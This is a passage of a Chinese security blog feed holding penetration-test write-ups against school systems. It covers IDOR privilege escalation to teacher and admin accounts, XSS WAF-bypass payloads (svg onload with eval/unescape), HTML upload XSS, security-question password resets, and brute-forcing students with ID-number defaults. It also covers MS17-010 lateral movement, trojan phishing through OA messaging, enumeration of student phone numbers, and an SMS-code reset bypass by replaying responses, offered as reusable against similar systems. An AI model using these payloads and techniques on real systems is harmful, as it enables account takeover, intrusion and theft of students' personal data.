    <a href="#%e6%89%a9%e5%b1%95%e5%9e%82%e7%9b%b4%e8%b6%8a%e6%9d%83" class="header-mark"></a>扩展：垂直越权</h4><p>不过这些都是修改 OA_User=id= 发现都是便利的一些学生 id，就想下能不能 get 到<strong>教师</strong>或者<strong>管理员</strong></p>
<p>记得还有个参数 Powerid= 6</p>
<p>便利学生的时候就发现有些 id 是遍历不出来的（这些可能就是管理员/教师）<strong>其中就有一个 id 是 5.</strong></p>
<p>为了方便确定信息这次点击个人基本信息</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002U8V3g2n7Cvu.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002U8V3g2n7Cvu.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002U8V3g2n7Cvu.jpg">
        
    </a><br>
1.通过遍历结果尝试修改 OA_User=id=54590 powerid=5</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000024Svjr4K12Z3.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000024Svjr4K12Z3.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000024Svjr4K12Z3.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001v1zZ51J1eh6.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001v1zZ51J1eh6.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001v1zZ51J1eh6.jpg">
        
    </a><br>
发现和我猜测的一样 ‘5’ 就是教师权限！拿到老师权限同样也是可以直接越权修改老师密码!</p>
<p>2.老师权限都试出来了，就想着管理员！！！</p>
<h5 id="划重点" class="headerLink">
    <a href="#%e5%88%92%e9%87%8d%e7%82%b9" class="header-mark"></a>划重点</h5><p>这里,通过遍历发现 40000-55000 都是可以便利的点,管理员这里面并没有出现!</p>
<p>所以说:一般这种系统<strong>管理员权限特殊</strong>会比较特殊，根据小编多年扣脚的经验 ，管理员 id=1，（这一点适用于大多数管理系统），同时权限做出的是数字越小权限越大，这里 powerid=1 放包注意和上面一样</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003zGAYN1ycXwP.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003zGAYN1ycXwP.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003zGAYN1ycXwP.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003Nl2Iz1BqrJF.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003Nl2Iz1BqrJF.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003Nl2Iz1BqrJF.jpg">
        
    </a></p>
<p>成功拿到管理员权限！泄露大量账号密码信息：</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001TdX773HxjdQ.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001TdX773HxjdQ.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001TdX773HxjdQ.jpg">
        
    </a></p>
<p>测试添加用户</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002MsEx31yDvk1.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002MsEx31yDvk1.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002MsEx31yDvk1.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003YicyK1X0Dyi.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003YicyK1X0Dyi.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003YicyK1X0Dyi.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00000020ZMu1SddCi.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00000020ZMu1SddCi.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00000020ZMu1SddCi.jpg">
        
    </a></p>
<p>直接可以任意添加管理员和导师账户！<strong>（声明：所有测试账户均已经删除，仅为测试所用）</strong></p>
<p>同样，进行功能点抓包修改可以越权修改管理员密码！</p>
<h3 id="xss经典绕-waf" class="headerLink">
    <a href="#xss%e7%bb%8f%e5%85%b8%e7%bb%95-waf" class="header-mark"></a>XSS（经典绕 waf）</h3><p>既然我能越权至教师账户，那就接着试一试 xss</p>
<p>在教师的功能点里面有一个学生信息列表，可以直接读取学生个人信息</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001WJExk1Z9awx.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001WJExk1Z9awx.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001WJExk1Z9awx.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002BLRej1r4lK0.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002BLRej1r4lK0.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002BLRej1r4lK0.jpg">
        
    </a></p>
<p>同时学生信息可以上传这些信息，那不是多好的储存型 xss 模板</p>
<p>话不多说开测：</p>
<h4 id="测试最基础的-payload" class="headerLink">
    <a href="#%e6%b5%8b%e8%af%95%e6%9c%80%e5%9f%ba%e7%a1%80%e7%9a%84-payload" class="header-mark"></a>测试最基础的 payload</h4><p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000014AWSv17XAoQ.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000014AWSv17XAoQ.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000014AWSv17XAoQ.jpg">
        
    </a><br>
初步测试只有<strong>专业特长</strong>和<strong>姓名</strong>没有输入限制，（别的只能是纯数字）</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000020YKS333hc8s.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000020YKS333hc8s.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000020YKS333hc8s.jpg">
        
    </a></p>
<p>好好好，这一下算是踢到软柿子中的最硬的了&ndash;waf (吗喽痛苦)</p>
<p>不过都到这里了，怎么也要绕一下！</p>
<h4 id="xss-绕-waf" class="headerLink">
    <a href="#xss-%e7%bb%95-waf" class="header-mark"></a>xss 绕 waf</h4><p>绕过一般思路! <strong>一、更改提交方式</strong> 在默认配置下，为了节省资源，许多 WAF 只会对 GET 请求进行过滤拦截，而忽略了对 POST 请求、Cookie、HTTP Header 等其他提交方式的检测。因此，攻击者可以尝试更改有害语句的提交方式，如将 GET 请求修改为 POST 请求，或者通过 Cookie、HTTP Header 等方式提交恶意脚本，以绕过 WAF 的拦截。</p>
<p><strong>二、混淆伪装绕过</strong> 混淆伪装是一种常见的绕过 WAF 的手段，攻击者通过编码、大小写混淆、双写、转义字符等方式对恶意脚本进行伪装，使其绕过 WAF 的关键词过滤规则。例如，将 JavaScript 代码中的关键字进行大小写混淆（如<code>&lt;scriPT&gt;</code>），或者使用 Unicode 编码、Base64 编码等方式对代码进行编码。</p>
<p><strong>三、标签和事件函数变换</strong> XSS 攻击主要是通过触发 HTML 标签中的事件函数来执行恶意脚本。因此，WAF 会重点识别能够触发事件函数的 HTML 标签和事件函数字段。攻击者可以尝试使用其他可以执行 JavaScript 代码的 HTML 标签（如<code>&lt;svg&gt;, &lt;button&gt;, &lt;img&gt;</code>等）替换常用的<code>&lt;script&gt;</code>标签，或者使用其他事件函数（如 onerror, oninput, onmousedown 等）替换常用的 onclick 事件函数，以绕过 WAF 的拦截。</p>
<p><strong>四、利用 WAF 的缺陷和配置不当</strong> 「增加 WAF 负担」：有些 WAF 在处理大量数据时可能会降低检测精度或放弃检测部分数据包。攻击者可以通过向 WAF 发送大量正常数据包并夹杂异常数据包的方式，增加 WAF 的负担，从而绕过 WAF 的检测。</p>
<p>「利用 WAF 配置不当」：WAF 的配置可能存在漏洞或不当之处，如只检测部分参数、忽略某些类型的请求等。攻击者可以通过分析 WAF 的配置规则，构造绕过 WAF 检测的请求。</p>
<p>「旁站绕过」：在某些情况下，网站管理员可能只对主站进行了 WAF 防护，而忽略了旁站或子域名的防护。攻击者可以尝试通过旁站或子域名绕过 WAF 的防护。</p>
<p><strong>五、使用自动化工具</strong> 自动化工具如 XSStrike 等可以帮助攻击者自动测试 WAF 的防护效果，并生成绕过 WAF 的 payload。这些工具通常包含多种绕过 WAF 的技巧和策略，可以显著提高攻击的成功率。 XSStrike 开源地址：<a href="https://github.com/s0md3v/XSStrike" target="_blank" rel="noopener noreferrer">https://github.com/s0md3v/XSStrike</a><br>
<strong>六、其他技巧</strong></p>
<ul>
<li>「利用伪协议」：某些 HTML 属性支持伪协议（如 javascript:），攻击者可以利用这些属性执行恶意脚本。</li>
<li>「利用 CSS 跨站」：在某些情况下，攻击者可以利用 CSS 中的某些特性（如 expression()）执行 JavaScript 代码。</li>
<li>「利用全局变量和函数」：JavaScript 中的全局变量和函数（如 eval(), window.onload 等）可以在不直接引用脚本标签的情况下执行代码，攻击者可以尝试利用这些变量和函数绕过 WAF 的防护。</li>
</ul>
<h4 id="这里进行一个一个尝试" class="headerLink">
    <a href="#%e8%bf%99%e9%87%8c%e8%bf%9b%e8%a1%8c%e4%b8%80%e4%b8%aa%e4%b8%80%e4%b8%aa%e5%b0%9d%e8%af%95" class="header-mark"></a>这里进行一个一个尝试</h4><h4 id="1大小写绕过" class="headerLink">
    <a href="#1%e5%a4%a7%e5%b0%8f%e5%86%99%e7%bb%95%e8%bf%87" class="header-mark"></a><strong>1.大小写绕过</strong></h4><p><code>&lt;sCript&gt;alert(1)&lt;/Script&gt;</code></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002lCzrr0iCCT1.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002lCzrr0iCCT1.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002lCzrr0iCCT1.jpg">
        
    </a></p>
<h4 id="2双写绕过不行" class="headerLink">
    <a href="#2%e5%8f%8c%e5%86%99%e7%bb%95%e8%bf%87%e4%b8%8d%e8%a1%8c" class="header-mark"></a>2、双写绕过(不行)</h4><p><code>&lt;sCri&lt;script&gt;alert(1)&lt;/script&gt;SC&lt;script&gt;ripT&gt;</code></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003T4vux3I97Ki.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003T4vux3I97Ki.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003T4vux3I97Ki.jpg">
        
    </a></p>
<h4 id="3img-标签" class="headerLink">
    <a href="#3img-%e6%a0%87%e7%ad%be" class="header-mark"></a>3.img 标签</h4><p><code>&lt;img src\\=15 onerror\\=(function(){alert(15)})()&gt;</code></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000019CJYT2MNXdN.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000019CJYT2MNXdN.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000019CJYT2MNXdN.jpg">
        
    </a></p>
<h4 id="4onmouseover-事件" class="headerLink">
    <a href="#4onmouseover-%e4%ba%8b%e4%bb%b6" class="header-mark"></a>4、onmouseover 事件</h4><p><code>&lt;a onmousemove\\=&quot;do something here&quot;&gt;\` </code>当用户鼠标移动时即可运行代码</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000004BrGdx2wX2Ks.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000004BrGdx2wX2Ks.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000004BrGdx2wX2Ks.jpg">
        
    </a></p>
<p>5、主动闭合标签实现注入代码</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000004GvwoR4PHjXZ.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000004GvwoR4PHjXZ.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000004GvwoR4PHjXZ.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002ZoOAZ21hhhn.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002ZoOAZ21hhhn.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002ZoOAZ21hhhn.jpg">
        
    </a></p>
<h4 id="6绕过-html-注释符" class="headerLink">
    <a href="#6%e7%bb%95%e8%bf%87-html-%e6%b3%a8%e9%87%8a%e7%ac%a6" class="header-mark"></a>6.绕过 HTML 注释符</h4><p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002jCpmK48IqBV.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002jCpmK48IqBV.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002jCpmK48IqBV.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003Om67G04ySfK.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003Om67G04ySfK.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003Om67G04ySfK.jpg">
        
    </a></p>
<h4 id="7利用换行符绕过" class="headerLink">
    <a href="#7%e5%88%a9%e7%94%a8%e6%8d%a2%e8%a1%8c%e7%ac%a6%e7%bb%95%e8%bf%87" class="header-mark"></a>7.利用换行符绕过</h4><p><code>&lt;img/src\\=14 onerror\\=window.alert(14)&gt;</code></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000026eidt3p4ccn.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000026eidt3p4ccn.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000026eidt3p4ccn.jpg">
        
    </a></p>
<h4 id="崩溃我是真的崩溃上字典开跑" class="headerLink">
    <a href="#%e5%b4%a9%e6%ba%83%e6%88%91%e6%98%af%e7%9c%9f%e7%9a%84%e5%b4%a9%e6%ba%83%e4%b8%8a%e5%ad%97%e5%85%b8%e5%bc%80%e8%b7%91" class="header-mark"></a>崩溃,我是真的崩溃!!!，上字典开跑</h4><p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000004etUAp42SukB.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000004etUAp42SukB.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000004etUAp42SukB.jpg">
        
    </a></p>
<h4 id="最后也是跑出来了一个" class="headerLink">
    <a href="#%e6%9c%80%e5%90%8e%e4%b9%9f%e6%98%af%e8%b7%91%e5%87%ba%e6%9d%a5%e4%ba%86%e4%b8%80%e4%b8%aa" class="header-mark"></a>最后也是跑出来了一个！！！</h4><p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000004cV06n3V702h.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000004cV06n3V702h.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000004cV06n3V702h.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003xyVEK4ABQwB.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003xyVEK4ABQwB.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003xyVEK4ABQwB.jpg">
        
    </a></p>
<p>发现<strong>使用 <code>&lt;svg&gt;</code> 标签和 <code>onload</code> 事件</strong>：</p>
<p>利用 <code>&lt;svg&gt;</code> 标签的 <code>onload</code> 事件触发 JavaScript 代码执行,使用 <code>unescape</code> 和 <code>eval</code> 结合的方式，对代码进行混淆和编码,将字符串 <code>'alert(1)'</code> 编码为 <code>'%61%6c%65%72%74%28%31%29'</code>，然后通过 <code>unescape</code> 将其还原，再使用 <code>eval</code> 执行还原后的代码</p>
<p>推测目标服务器:缺乏对动态代码执行的检测，或检测机制不足以处理复杂的动态执行逻辑。对常见的 <code>onclick</code>、<code>onmouseover</code> 等事件进行了更严格的过滤，但对 <code>onload</code> 事件的过滤不足。通过 <code>onload</code> 事件触发执行，绕过了可能针对其他事件（如 <code>onclick</code>、<code>onmouseover</code>）的过滤。可以尝试其他不常见但有效的事件（如 <code>onfocus</code>、<code>onerror</code>）进行绕过。服务器可能没有对 URI 编码（如 <code>%61%6c%65%72%74%28%31%29</code>）进行解码并检查。这表示过滤器可能缺乏对编码/解码操作的深度检测。</p>
<p>牛掰,还是网传的字典牛掰,自己还得练</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001KE9yE2gqtX7.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001KE9yE2gqtX7.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001KE9yE2gqtX7.jpg">
        
    </a></p>
<p>最终也是终于弹出来了</p>
<h3 id="文件上传-xss" class="headerLink">
    <a href="#%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0-xss" class="header-mark"></a>文件上传 XSS</h3><p>在测试功能点的时候发现存在文件上传点,</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000004XMn6M3QoFmJ.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000004XMn6M3QoFmJ.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000004XMn6M3QoFmJ.jpg">
        
    </a><br>
aspx 语言首先想尝试一句话木马</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003rEVVM2Kiy66.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003rEVVM2Kiy66.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003rEVVM2Kiy66.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000uLhwX4HTBjX.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000uLhwX4HTBjX.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000uLhwX4HTBjX.jpg">
        
    </a></p>
<p>直接又是不行,这里小编上传木马能力有限,抓包分析</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001CA2pO49aS9Y.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001CA2pO49aS9Y.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001CA2pO49aS9Y.jpg">
        
    </a><br>
发现他是接收 html 的</p>
<p>尝试用 html 弹出一个 xss</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001HM2C63VO1B9.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001HM2C63VO1B9.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001HM2C63VO1B9.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002I5bYE4T8z2C.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002I5bYE4T8z2C.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002I5bYE4T8z2C.jpg">
        
    </a><br>
老师界面观察也是成功的打上一下(水平较低)</p>
<p>整体拿下来观察是非常经典的一次后台打包,根据分析<strong>该系统普遍存在于学校毕业设计</strong>,整体的思路都是通用的,想类似的系统可以多尝试,类似是一种毕设通杀!!</p>
<p>(所有增添账号和上传文件均删除)</p>]]></description>
</item><item>
    <title>教育行业渗透打点</title>
    <link>http://localhost:1313/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/</link>
    <pubDate>Sun, 28 Jul 2024 18:23:14 &#43;0800</pubDate><author>
        <name>bysec</name>
    </author><guid>http://localhost:1313/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/</guid>
    <description><![CDATA[<blockquote>
<p><em>转载自： <a href="https://forum.butian.net/share/2423" target="_blank" rel="noopener noreferrer">https://forum.butian.net/share/2423</a></em></p>
</blockquote>
<p>1、OA系统密码找回 找回密码 系统使用说明文档中发现登录账号 600030 密码找回，找回方式选择密保问题 问题选择出生地，密保问题答案填写高校所在地 即可修改密码 修改密码，即可以图文信息&hellip;</p>
<h2 id="1oa系统密码找回" class="headerLink">
    <a href="#1oa%e7%b3%bb%e7%bb%9f%e5%af%86%e7%a0%81%e6%89%be%e5%9b%9e" class="header-mark"></a>1、OA系统密码找回</h2><h2 id="找回密码" class="headerLink">
    <a href="#%e6%89%be%e5%9b%9e%e5%af%86%e7%a0%81" class="header-mark"></a>找回密码</h2><p>系统使用说明文档中发现登录账号 600030</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000004UrAaa0hDNRU.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000004UrAaa0hDNRU.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000004UrAaa0hDNRU.jpg">
        
    </a></p>
<p>密码找回，找回方式选择密保问题</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000032mnlY3PpOhd.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000032mnlY3PpOhd.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000032mnlY3PpOhd.jpg">
        
    </a></p>
<p>问题选择出生地，密保问题答案填写高校所在地</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000004Nk0wu0BMZlH.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000004Nk0wu0BMZlH.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000004Nk0wu0BMZlH.jpg">
        
    </a></p>
<p>即可修改密码</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000004bnEDh05JXan.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000004bnEDh05JXan.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000004bnEDh05JXan.jpg">
        
    </a></p>
<p>修改密码，即可以图文信息中心的身份登录OA系统</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002btP6H0mXX3t.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002btP6H0mXX3t.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002btP6H0mXX3t.jpg">
        
    </a></p>
<p>在文件中找到1400多名学生的敏感信息文件，其中存在手机号、身份证号、学号，可以组合密码本进行统一身份认证系统的爆破登录，默认密码为身份证后六位</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002KXPbU1ya42t.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002KXPbU1ya42t.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002KXPbU1ya42t.jpg">
        
    </a></p>
<p>成功登录一部分账号</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001qdUt93qwJJq.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001qdUt93qwJJq.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001qdUt93qwJJq.jpg">
        
    </a></p>
<h2 id="登录vpn" class="headerLink">
    <a href="#%e7%99%bb%e5%bd%95vpn" class="header-mark"></a>登录VPN</h2><p>进行内网扫描，利用MS17010拿下C段多台主机权限</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001EcXz841eUJe.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001EcXz841eUJe.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001EcXz841eUJe.jpg">
        
    </a></p>
<h2 id="钓鱼" class="headerLink">
    <a href="#%e9%92%93%e9%b1%bc" class="header-mark"></a>钓鱼</h2><p>利用OA系统的通讯功能，散播木马</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003bmMjx1zeL4E.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003bmMjx1zeL4E.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003bmMjx1zeL4E.jpg">
        
    </a></p>
<p>获取多台机器权限</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000oFuZj2LSw90.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000oFuZj2LSw90.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000oFuZj2LSw90.jpg">
        
    </a></p>
<h2 id="2逻辑漏洞修改密码" class="headerLink">
    <a href="#2%e9%80%bb%e8%be%91%e6%bc%8f%e6%b4%9e%e4%bf%ae%e6%94%b9%e5%af%86%e7%a0%81" class="header-mark"></a>2、逻辑漏洞修改密码</h2><h2 id="github密码泄漏" class="headerLink">
    <a href="#github%e5%af%86%e7%a0%81%e6%b3%84%e6%bc%8f" class="header-mark"></a>GitHub密码泄漏</h2><p>GitHub泄漏学号密码</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003VLa3e1UjMCe.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003VLa3e1UjMCe.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003VLa3e1UjMCe.jpg">
        
    </a></p>
<p>但账号已被禁用</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003pitU03MEjjt.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003pitU03MEjjt.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003pitU03MEjjt.jpg">
        
    </a></p>
<h2 id="获取学号手机号" class="headerLink">
    <a href="#%e8%8e%b7%e5%8f%96%e5%ad%a6%e5%8f%b7%e6%89%8b%e6%9c%ba%e5%8f%b7" class="header-mark"></a>获取学号手机号</h2><p>存在注册功能的网站注册用户，然后登录</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003zaAW33Niuwl.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003zaAW33Niuwl.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003zaAW33Niuwl.jpg">
        
    </a></p>
<p>通过以下接口获得用户ID /User/GetUserListByKeyWord</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002w65kV1vNBL4.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002w65kV1vNBL4.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002w65kV1vNBL4.jpg">
        
    </a></p>
<p>可以通过以下接口遍历用户ID，获取任意用户的姓名 手机号 邮箱等敏感信息</p>
<p>/User/Tip?time61&amp;id=caec35e7-9956-4f68-98bc-e2aee73ebda5&amp;_=1664438691592</p>
<p>获取多组学号、姓名、手机号</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000V8TJA3fcDkY.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000V8TJA3fcDkY.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000V8TJA3fcDkY.jpg">
        
    </a></p>
<h2 id="修改密码" class="headerLink">
    <a href="#%e4%bf%ae%e6%94%b9%e5%af%86%e7%a0%81" class="header-mark"></a>修改密码</h2><p>点击同意门户的忘记密码功能，输入上面得到的学号</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000043XCYR1AAy9G.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000043XCYR1AAy9G.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000043XCYR1AAy9G.jpg">
        
    </a></p>
<p>输入手机号，点击获取验证码并抓包</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000004SAkz644cTqZ.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000004SAkz644cTqZ.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000004SAkz644cTqZ.jpg">
        
    </a></p>
<p>记录回包内容</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="s2">&#34;datas&#34;</span><span class="o">:</span><span class="s2">&#34;{</span><span class="se">\&#34;</span><span class="s2">sign</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">407ec6dc275f4766a4525e059a60ca16</span><span class="se">\&#34;</span><span class="s2">}&#34;</span><span class="p">,</span><span class="s2">&#34;code&#34;</span><span class="o">:</span><span class="s2">&#34;0&#34;</span><span class="p">,</span><span class="s2">&#34;message&#34;</span><span class="o">:</span><span class="s2">&#34;获取成功&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>随意输入验证码，点击下一步，并把上面的流量包直接返回</p>
